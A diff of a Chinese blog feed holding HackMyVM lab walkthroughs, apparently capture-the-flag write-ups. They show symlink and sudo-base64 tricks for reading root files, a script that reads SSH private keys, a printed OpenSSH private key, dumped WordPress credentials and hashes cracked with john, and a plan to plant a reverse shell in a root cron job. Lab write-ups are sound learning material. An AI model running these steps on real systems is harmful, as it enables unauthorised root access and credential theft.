/opt/lzh.sh</span><br><span class="line"><span class="symbol">jan:</span>/etc/ssh<span class="variable">$ </span>cat /opt/lzh.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">cd /home/ssh</span><br><span class="line">cat backup/hi</span><br></pre></td></tr></table></figure></div>
-<p>内容是查看&#x2F;home&#x2F;ssh&#x2F;backup&#x2F;hi<br>现在的目标是如何利用这个脚本能读到&#x2F;root&#x2F;root.txt呢<br>没有修改hi的权限，对hi没有任何的权限<br>但是对backup这个目录有x操作权限，无法删除就把backup重命名<br>然后新建一个backup 然后用软链接就可以读到了<br>（我一直在hi这个文件里面想，其实啥都没有）</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sv /root/root.txt /home/ssh/backup/hi</span><br><span class="line"><span class="built_in">sudo</span> /opt/lzh.sh</span><br></pre></td></tr></table></figure></div>
-
-<h1 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h1><p>通过第一阶段就可以知道，利用lzh.sh就可以读取任意文件内容<br>所以可以编写一个脚本，脚本内容来自群里的eviden</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span>[ -e <span class="string">&quot;backup&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">rm</span> -rf backup</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;removed&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">mkdir</span> -p backup</span><br><span class="line">source_file=<span class="variable">$1</span></span><br><span class="line"><span class="built_in">ln</span> -sn <span class="string">&quot;<span class="variable">$&#123;$source_file&#125;</span>&quot;</span> <span class="string">&quot;/home/ssh/backup/hi&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> /opt/lzh.sh</span><br></pre></td></tr></table></figure></div>
-<p>这样子就可以自动读取了<br>我们去读ssh的配置文件，思路是读取私钥然后登录root</p>
-<p>找到ssh私钥的地址 但是不是id_rsa是id_ed25519，而且这个目录在root目录下面，不是ssh目录，就觉得为什么有私钥还登录不上root，hhhhh</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">jan:~$ .<span class="regexp">/m.sh /</span>etc<span class="regexp">/ssh/</span>ssh_config</span><br><span class="line">removed</span><br><span class="line"><span class="string">&#x27;backup/hi&#x27;</span> -&gt; <span class="string">&#x27;/etc/ssh/ssh_config&#x27;</span></span><br><span class="line"><span class="comment">#	$OpenBSD: ssh_config,v 1.36 2023/08/02 23:04:38 djm Exp $</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is the ssh client system-wide configuration file.  See</span></span><br><span class="line"><span class="comment"># ssh_config(5) for more information.  This file provides defaults for</span></span><br><span class="line"><span class="comment"># users, and the values can be changed in per-user configuration files</span></span><br><span class="line"><span class="comment"># or on the command line.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configuration data is parsed as follows:</span></span><br><span class="line"><span class="comment">#  1. command line options</span></span><br><span class="line"><span class="comment">#  2. user-specific file</span></span><br><span class="line"><span class="comment">#  3. system-wide file</span></span><br><span class="line"><span class="comment"># Any configuration value is only changed the first time it is set.</span></span><br><span class="line"><span class="comment"># Thus, host-specific definitions should be at the beginning of the</span></span><br><span class="line"><span class="comment"># configuration file, and defaults at the end.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site-wide defaults for some commonly used options.  For a comprehensive</span></span><br><span class="line"><span class="comment"># list of available options, their meanings and defaults, please see the</span></span><br><span class="line"><span class="comment"># ssh_config(5) man page.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Include configuration snippets before processing this file to allow the</span></span><br><span class="line"><span class="comment"># snippets to override directives set in this file.</span></span><br><span class="line"><span class="comment">#Include /etc/ssh/ssh_config.d/*.conf</span></span><br><span class="line"><span class="comment">#Banner /etc/shadow</span></span><br><span class="line"><span class="comment"># Host *</span></span><br><span class="line"><span class="comment">#   ForwardAgent no</span></span><br><span class="line"><span class="comment">#   ForwardX11 no</span></span><br><span class="line"><span class="comment">#   PasswordAuthentication yes</span></span><br><span class="line"><span class="comment">#   HostbasedAuthentication no</span></span><br><span class="line"><span class="comment">#   GSSAPIAuthentication no</span></span><br><span class="line"><span class="comment">#   GSSAPIDelegateCredentials no</span></span><br><span class="line"><span class="comment">#   BatchMode no</span></span><br><span class="line"><span class="comment">#   CheckHostIP no</span></span><br><span class="line"><span class="comment">#   AddressFamily any</span></span><br><span class="line"><span class="comment">#   ConnectTimeout 0</span></span><br><span class="line"><span class="comment">#   StrictHostKeyChecking ask</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_rsa</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_dsa</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_ecdsa</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_ed25519</span></span><br><span class="line"><span class="comment">#   Port 22</span></span><br><span class="line"><span class="comment">#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc</span></span><br><span class="line"><span class="comment">#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com</span></span><br><span class="line"><span class="comment">#   EscapeChar ~</span></span><br><span class="line"><span class="comment">#   Tunnel no</span></span><br><span class="line"><span class="comment">#   TunnelDevice any:any</span></span><br><span class="line"><span class="comment">#   PermitLocalCommand no</span></span><br><span class="line"><span class="comment">#   VisualHostKey no</span></span><br><span class="line"><span class="comment">#   ProxyCommand ssh -q -W %h:%p gateway.example.com</span></span><br><span class="line"><span class="comment">#   RekeyLimit 1G 1h</span></span><br><span class="line"><span class="comment">#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k</span></span><br></pre></td></tr></table></figure></div>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">jan:~$ .<span class="regexp">/m.sh /</span>root<span class="regexp">/.ssh/i</span>d_ed25519</span><br></pre></td></tr></table></figure></div>
-<p>vi id_rsa<br>chmod 600 id_rsa<br>ssh <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#x32;&#x34;&#48;&#x2e;&#x31;&#x35;">root@192.168.240.15</a> -i id_rsa</p>
-<pre><code>登录root了
-
-
-</code></pre>
+<p><img src="https://pic1.imgdb.cn/item/679a35f9d0e0a243d4f878d0.png"></p>
+<h1 id="Baseme"><a href="#Baseme" class="headerlink" title="Baseme"></a>Baseme</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a3980d0e0a243d4f87970.png" alt="|500"><br>开放了22端口和80端口</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>web给了一行base64加密过的文本  得到一个用户名 lucas<br><img src="https://pic1.imgdb.cn/item/679a3983d0e0a243d4f87971.png" alt="|425"><br>提示这个靶机全部用的是base64<br><img src="https://pic1.imgdb.cn/item/679a3985d0e0a243d4f87972.png" alt="|350"><br>还给了一些密码字典  我们存储并且进行base64</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/base]</span><br><span class="line">└─# <span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">cat</span> pass);<span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span> | <span class="built_in">base64</span> &gt;&gt; pass.txt;<span class="keyword">done</span> </span><br><span class="line">┌──(root㉿kakeru)-[~/base]</span><br><span class="line">└─# <span class="built_in">cat</span> pass.txt     </span><br><span class="line">aWxvdmV5b3UK</span><br><span class="line">eW91bG92ZXlvdQo=</span><br><span class="line">c2hlbG92ZXN5b3UK</span><br><span class="line">aGVsb3Zlc3lvdQo=</span><br><span class="line">d2Vsb3ZleW91Cg==</span><br><span class="line">dGhleWhhdGVzbWUK</span><br></pre></td></tr></table></figure></div>
+<p>然后再进行目录爆破<br>用gobuster midium字典爆破之后还是没有发现有用的目录   换dirb&#x2F;common.txt字典<br>还是没有找到任何有用的信息  这里的字典要再用base64进行编码然后爆破  找到了两个目录<br><img src="https://pic1.imgdb.cn/item/679a3989d0e0a243d4f87974.png"><br>curl访问得到一串base64编码  解密之后得到是rsa密钥 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL</span><br><span class="line">BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1</span><br><span class="line">cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG</span><br><span class="line"><span class="number">07</span>jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL<span class="symbol">/ptLk26RBnh</span></span><br><span class="line"><span class="number">7</span>bHG1JjGlxOkO6m<span class="operator">+</span><span class="number">1</span>oFNLtNuD2QPl8sbZtEzX4S9nNZ<span class="symbol">/dpyRpMfmB73rN3yyIylevVDEyv</span></span><br><span class="line">f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq<span class="operator">+</span>b8ol8RZZ6jHXAhiblBXwpAm4</span><br><span class="line">vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj<span class="symbol">/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X</span></span><br><span class="line">YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM<span class="operator">+</span><span class="number">3</span>mzWjPdoBK<span class="symbol">/Ho339uPmBWI5sbMrpK</span></span><br><span class="line">xkZMnl<span class="operator">+</span>rcTbgz4swv8gNuKhUc7wTgtrNX<span class="operator">+</span>PNMdIALNpsxYLt<span class="symbol">/l56GK8R4J8fLIU5+MojRs</span></span><br><span class="line"><span class="operator">+</span><span class="number">1</span>NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp<span class="operator">+</span>YPFIgx8okMjJgnbi</span><br><span class="line">NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4<span class="operator">+</span>dW7nZ</span><br><span class="line">zjf3p0M77b<span class="symbol">/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0</span></span><br><span class="line">IJh<span class="operator">+</span>I<span class="operator">+</span>Zv1egSMS<span class="symbol">/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI</span></span><br><span class="line">pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5<span class="symbol">/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ</span></span><br><span class="line">MJr8k5Ac0CX03fXESpmsUUVS<span class="operator">+</span><span class="symbol">/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp</span></span><br><span class="line"><span class="operator">+</span><span class="number">8</span>gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV</span><br><span class="line">tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh</span><br><span class="line">i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ<span class="symbol">/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+</span></span><br><span class="line">tSn7hr8hppT2tUSxDvC<span class="operator">+</span>USMmw<span class="symbol">/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw</span></span><br><span class="line">N7bw45FhBZCsHCAbV2<span class="operator">+</span>hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM</span><br><span class="line">Aif<span class="symbol">/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ</span></span><br><span class="line">O<span class="operator">+</span>TowA10RATek6ZEIxh6SmtDG<span class="symbol">/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2</span></span><br><span class="line">TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl</span><br><span class="line"><span class="number">3</span><span class="symbol">/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL</span></span><br><span class="line">ND8ikgmQvF6hrwwJBrp<span class="symbol">/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ</span></span><br><span class="line">LdmmRXUS<span class="operator">/</span>DtO<span class="operator">+</span><span class="number">69</span><span class="operator">/</span>aidvxGAYob<span class="operator">+</span><span class="number">1</span>M<span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
+<p>尝试使用ssh登录<br><img src="https://pic1.imgdb.cn/item/679a3988d0e0a243d4f87973.png"><br>发现不能直接登录 根据提示执行 <code> ssh-keygen -f &#39;/root/.ssh/known_hosts&#39; -R &#39;192.168.240.45&#39;</code><br>然后需要密码  用一开始得到的几个密码的base64编码进行尝试  发现用第一个就能登录<br><img src="https://pic1.imgdb.cn/item/679a3c2cd0e0a243d4f879d4.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code><br>查找有没有suid提权</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">lucas<span class="variable">@baseme</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/sudo</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chfn</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/openssh</span><span class="regexp">/ssh-keysign</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/dbus</span>-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br></pre></td></tr></table></figure></div>
+<p>没有可以利用的  在查看用户有没有sudo权限<br><img src="https://pic1.imgdb.cn/item/679a3c2bd0e0a243d4f879d3.png"><br>发现可以执行base64<br>提权方式：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">LFILE=file_to_read</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">base64</span> <span class="string">&quot;<span class="variable">$LFILE</span>&quot;</span> | <span class="built_in">base64</span> --decode</span><br></pre></td></tr></table></figure></div>
+<p>通过这种方式可以直接用root权限查想要的文件  也可以直接查root的ssh的rsa密钥  &#x2F;root&#x2F;.ssh&#x2F;id_rsa</p>
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -1951,8 +1871,8 @@ root@flower:/#
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>HMV</tag>
         <tag>靶场</tag>
+        <tag>HMV</tag>
       </tags>
   </entry>
   <entry>
@@ -1974,29 +1894,70 @@ root@flower:/#
 <p>成功拿到shell</p>
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>拿到shell之后看wordpress的配置文件</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@listen</span><span class="symbol">:~/html/wordpress</span><span class="variable">$ </span>cat wp-config.php</span><br></pre></td></tr></table></figure></div>
+
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LASSO"><figure class="iseeu highlight /lasso"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ** Database settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database username */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;ll104567&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database password */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;thehandsomeguy&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database hostname */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database charset to use in creating database tables. */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The database collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br></pre></td></tr></table></figure></div>
+
 <p>发现数据库泄露 </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">MariaDB [wordpress]&gt; select <span class="symbol">*</span> from wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">|<span class="string"> ID </span>|<span class="string"> user_login </span>|<span class="string"> user_pass                          </span>|<span class="string"> user_nicename </span>|<span class="string"> user_email        </span>|<span class="string"> user_url              </span>|<span class="string"> user_registered     </span>|<span class="string"> user_activation_key                           </span>|<span class="string"> user_status </span>|<span class="string"> display_name </span>|</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">|<span class="string">  1 </span>|<span class="string"> ta0        </span>|<span class="string"> $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. </span>|<span class="string"> ta0           </span>|<span class="string"> 2814928906@qq.com </span>|<span class="string"> http://192.168.31.181 </span>|<span class="string"> 2025-01-08 03:10:43 </span>|<span class="string">                                               </span>|<span class="string">           0 </span>|<span class="string"> ta0          </span>|</span><br><span class="line">|<span class="string">  2 </span>|<span class="string"> welcome    </span>|<span class="string"> $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ </span>|<span class="string"> welcome       </span>|<span class="string"> 127.0.0.1@qq.com  </span>|<span class="string">                       </span>|<span class="string"> 2025-01-08 04:29:28 </span>|<span class="string"> 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD. </span>|<span class="string">           0 </span>|<span class="string"> welcome      </span>|</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">2 rows in set (0.014 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [wordpress]&gt; </span><br><span class="line">````</span><br><span class="line">得到两个用户名和密码,然后用john可以跑出来welcome的密码,接下来就切换到welcome用户操作</span><br></pre></td></tr></table></figure></div>
-<p>┌──(root㉿kakeru)-[~&#x2F;tmp]<br>└─# john tmp<br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128&#x2F;128 ASIMD 4x2])<br>Cost 1 (iteration count) is 8192 for all loaded hashes<br>Will run 2 OpenMP threads<br>Proceeding with single, rules:Single<br>Press ‘q’ or Ctrl-C to abort, almost any other key for status<br>Almost done: Processing the remaining buffered candidate passwords, if any.<br>Proceeding with wordlist:&#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst<br>Proceeding with incremental:ASCII<br>104567           (?)<br>1g 0:00:00:22 DONE 3&#x2F;3 (2025-02-05 18:05) 0.04403g&#x2F;s 8169p&#x2F;s 8169c&#x2F;s 8169C&#x2F;s milling1..192011<br>Use the “–show –format&#x3D;phpass” options to display all of the cracked passwords reliably<br>Session completed. </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">有一个gobuster的<span class="built_in">sudo</span>权限</span><br></pre></td></tr></table></figure></div>
-<p>$ sudo -l<br>Matching Defaults entries for welcome on listen:<br>    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</p>
-<p>User welcome may run the following commands on listen:<br>    (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;gobuster</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">现在需要我们用一个pspy64程序看定时任务 下载地址在</span><br><span class="line">`https:<span class="regexp">//gi</span>thub.com<span class="regexp">/DominicBreuker/</span>pspy<span class="regexp">/releases/</span>latest<span class="regexp">/download/</span>pspy64`</span><br></pre></td></tr></table></figure></div>
-<p>welcome@listen:~$ wget 192.168.240.83:8080&#x2F;pspy64<br>–2025-02-05 05:17:15–  <a href="http://192.168.240.83:8080/pspy64">http://192.168.240.83:8080/pspy64</a><br>Connecting to 192.168.240.83:8080… connected.<br>HTTP request sent, awaiting response… 200 OK<br>Length: 3104768 (3.0M) [application&#x2F;octet-stream]<br>Saving to: ‘pspy64’</p>
-<p>pspy64                       100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]   2.96M  –.-KB&#x2F;s    in 0.1s    </p>
-<p>2025-02-05 05:17:15 (30.4 MB&#x2F;s) - ‘pspy64’ saved [3104768&#x2F;3104768]</p>
-<p>welcome@listen:<del>$ chmod 777 pspy64<br>welcome@listen:</del>$ .&#x2F;pspy64</p>
-<p>2025&#x2F;02&#x2F;05 05:18:01 CMD: UID&#x3D;0     PID&#x3D;2047   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f<br>2025&#x2F;02&#x2F;05 05:18:01 CMD: UID&#x3D;0     PID&#x3D;2048   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f<br>2025&#x2F;02&#x2F;05 05:18:01 CMD: UID&#x3D;0     PID&#x3D;2049   | &#x2F;bin&#x2F;sh -c &#x2F;bin&#x2F;bash &#x2F;opt&#x2F;.test.sh<br>2025&#x2F;02&#x2F;05 05:19:01 CMD: UID&#x3D;0     PID&#x3D;2050   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f<br>2025&#x2F;02&#x2F;05 05:19:01 CMD: UID&#x3D;0     PID&#x3D;2051   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f<br>2025&#x2F;02&#x2F;05 05:19:01 CMD: UID&#x3D;0     PID&#x3D;2052   | &#x2F;bin&#x2F;sh -c &#x2F;bin&#x2F;bash &#x2F;opt&#x2F;.test.sh </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">看到root会定时写入/opt/.<span class="keyword">test</span>.<span class="keyword">sh</span></span><br><span class="line">所以我们的目标就是在.<span class="keyword">test</span>.<span class="keyword">sh</span>中写入文件 （反弹<span class="keyword">shell</span>）</span><br><span class="line">大佬们的思路太nb了,就是利用gobuster输出结果的回显来写入命令</span><br><span class="line">具体是这样的: 在本机开http服务,创建文件夹，在靶机用gobuster自己创一个字典，指向我们在本机的文件夹，这样就会显示靶机中字典文件中的内容</span><br></pre></td></tr></table></figure></div>
-<p> ──(root㉿kakeru)-[~&#x2F;tmp]<br>└─# touch a</p>
-<p>┌──(root㉿kakeru)-[~&#x2F;tmp]<br>└─# python3 -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (<a href="http://0.0.0.0/">http://0.0.0.0:80/</a>) …<br>192.168.240.231 - - [05&#x2F;Feb&#x2F;2025 18:37:20] “GET &#x2F; HTTP&#x2F;1.1” 200 -<br>192.168.240.231 - - [05&#x2F;Feb&#x2F;2025 18:37:20] code 404, message File not found<br>192.168.240.231 - - [05&#x2F;Feb&#x2F;2025 18:37:20] “GET &#x2F;f7c3be62-4f83-404f-9236-89f88603c3f8 HTTP&#x2F;1.1” 404 -<br>192.168.240.231 - - [05&#x2F;Feb&#x2F;2025 18:37:20] “GET &#x2F;a HTTP&#x2F;1.1” 200 -</p>
-<p>welcome@listen:&#x2F;tmp$ touch a.txt<br>welcome@listen:&#x2F;tmp$ echo “a” &gt; a.txt<br>welcome@listen:&#x2F;tmp$ sudo gobuster -u 192.168.240.83 -w &#x2F;tmp&#x2F;a.txt -q -n<br>welcome@listen:&#x2F;tmp$ sudo gobuster -u 192.168.240.83 -w &#x2F;tmp&#x2F;a.txt -q -n<br>&#x2F;a</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">因为gobuster找到字典中可以访问的目录就会显示 `-q -<span class="keyword">n</span>`是为了不输出banner和状态码</span><br><span class="line">这样字我们就可以写反弹<span class="keyword">shell</span>了 用-o将结果输出到/opt/.<span class="keyword">test</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure></div>
-<p>┌──(root㉿kakeru)-[~]<br>└─# touch b</p>
